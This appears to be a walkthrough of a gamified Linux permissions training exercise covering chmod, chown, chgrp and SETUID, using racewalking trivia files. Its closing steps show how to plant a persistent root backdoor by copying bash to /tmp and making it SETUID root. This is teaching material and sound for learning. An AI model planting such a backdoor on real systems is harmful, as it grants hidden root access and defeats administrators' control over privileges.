Permissions (1)
Linux uses discretionary permissions on all files for the owner, the group, and other.
Identify the owner of the racewalkingfact1.txt file.

Permissions (2)
Attempt to examine the contents of the racewalkingfact1.txt file.

    olympian@bc-permissions:~$ cat racewalkingfact1.txt 
    cat: racewalkingfact1.txt: Permission denied

Permissions (3)
You cannot examine the racewalkingfact1.txt file since you don't have permissions to read the file.
Change the file permissions by running 'chmod 600 racewalkingfact1.txt'.

    olympian@bc-permissions:~$ chmod 600 racewalkingfact1.txt 

Permissions (4)
The permission 600 indicates read/write for owner (6), no permission for group (0) and no permission for other (0).
Re-examine the permissions of the racewalkingfact1.txt file.

Permissions (20)
File ownership is controlled by the chown command.
Attempt to change the ownership of the racewalkingfact7.txt file to the olympian user with the chown command.

    olympian@bc-permissions:~$ chown olympian racewalkingfact7.txt 
    chown: changing ownership of 'racewalkingfact7.txt': Operation not permitted

Permissions (21)
Only the root user can change the ownership of a file. Repeat the last chown command, this time adding the sudo command to the beginning of the command.

    olympian@bc-permissions:~$ sudo chown olympian racewalkingfact7.txt 

Permissions (22)
Display the contents of the racewalkingfact7.txt file.

    olympian@bc-permissions:~$ cat racewalkingfact7.txt 
    Athletes from the now defunct Soviet Union have won the most race walking events at the Olympics, with 13 medals.

Permissions (23)
Unlike ownership, a user can change a group assignment to any other group where they are a member.
Change the group of racewalkingfact8.txt to athlete using the chgrp command.

    olympian@bc-permissions:~$ chgrp athlete racewalkingfact8.txt 

Permissions (24)
Display the contents of the racewalkingfact8.txt file.

    olympian@bc-permissions:~$ chmod 777 racewalkingfact8.txt 
    olympian@bc-permissions:~$ cat racewalkingfact8.txt 
    In racewalking, the stride length is reduced, so to achieve competitive speeds, race walkers must attain pace rates comparable to those achieved by Olympic 400-meter runners.

Permissions (25)
The racewalkingfact9 file is a compiled program. Change the file so that it is read/write/executable for the owner, read/executable for group and other.

    olympian@bc-permissions:~$ chmod 755 racewalkingfact9

Permissions (26)
Execute the racewalkingfact9 program.

    olympian@bc-permissions:~$ ./racewalkingfact9
    Hello olympian. Your effective user ID is 1051.

Permissions (27)
The permission 755 implies a leading zero: 0755. When you set the leading 0 to 4, the file is SETUID, and will run with the permissions of the owner, not the user running the program.
Change the owner of racewalkingfact9 to root.

    olympian@bc-permissions:~$ sudo chown root racewalkingfact9

Permissions (28)
SETUID files can be dangerous on the file system, since they grant privileges of the file owner.
Change the permission of racewalkingfact9 to 4755 to make it SETUID.

    olympian@bc-permissions:~$ sudo chmod 4755 racewalkingfact9

Permissions (29)
Execute the racewalkingfact9 program as a normal user.

    olympian@bc-permissions:~$ ./racewalkingfact9
    Hello root. Your effective user ID is 0. Also, I have a fact for you:.

    The racewalking violation of having both feet off the ground is known as flying.

Permissions (30)
An attacker with root access can use SETUID permissions to create a backdoor.
Copy the /bin/bash file to /tmp/backdoor.

    olympian@bc-permissions:~$ cp /bin/bash /tmp/backdoor

Permissions (31)
An attacker with root access can use SETUID permissions to create a backdoor.
Change the ownership of /tmp/backdoor to root.

    olympian@bc-permissions:~$ sudo chown root /tmp/backdoor 

Permissions (32)
An attacker with root access can use SETUID permissions to create a backdoor.
Change the permissions of /tmp/backdoor to 4755 (SETUID).

    olympian@bc-permissions:~$ sudo chmod 4755 /tmp/backdoor

Permissions (33)
An attacker with root access can use SETUID permissions to create a backdoor.
We have revoked your sudo access, but you can still get root access by running the backdoor command with the -p argument.

    olympian@bc-permissions:/tmp$ backdoor

Congratulations! You have completed the Linux Permissions qualifying event for the Linux Olympics! üèÖüèÖüèÖ
You have demonstrated true skill, and are ready to compete as a true contender for the Linux gold medal.
